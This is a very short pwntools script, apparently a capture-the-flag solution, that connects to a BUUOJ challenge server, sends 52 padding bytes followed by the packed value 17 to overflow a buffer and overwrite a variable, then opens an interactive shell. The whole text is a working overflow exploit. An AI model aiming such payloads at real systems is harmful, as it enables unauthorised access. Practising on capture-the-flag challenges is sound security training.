from pwn import *
sh=remote("node4.buuoj.cn",28440)
#sh=process("./timu")
payload=13*4*b'a'+p32(17)
sh.sendline(payload)
sh.interactive()
